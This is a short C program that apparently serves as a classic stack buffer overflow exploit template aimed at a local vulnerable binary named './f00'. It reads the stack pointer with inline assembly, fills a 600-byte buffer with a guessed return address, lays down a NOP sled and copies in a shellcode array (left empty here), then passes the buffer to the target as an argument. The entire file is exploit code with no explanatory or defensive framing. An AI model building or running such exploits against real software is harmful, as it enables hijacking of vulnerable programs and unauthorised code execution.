#include <stdlib.h>

char shellcode[] = "";

unsigned long sp(void)         
{ __asm__("movl %esp, %eax");} 

int main(int argc, char *argv[])
{
  int i, offset;
  long esp, ret, *addr_ptr;
  char *buffer, *ptr;

  offset = 0;                 
  esp = sp();                 
  ret = esp - offset;         

  printf("Stack pointer (ESP) : 0x%x\n", esp);
  printf("    Offset from ESP : 0x%x\n", offset);
  printf("Desired Return Addr : 0x%x\n", ret);


  buffer = malloc(600);


  ptr = buffer;
  addr_ptr = (long *) ptr;
  for(i=0; i < 600; i+=4)
  { *(addr_ptr++) = ret; }



  for(i=0; i < 200; i++)
  { buffer[i] = '\x90'; }

  ptr = buffer + 200;
  for(i=0; i < strlen(shellcode); i++)
  { *(ptr++) = shellcode[i]; }


  buffer[600-1] = 0;
  execl("./f00", "f00", buffer, 0);


  free(buffer);
  return 0;
}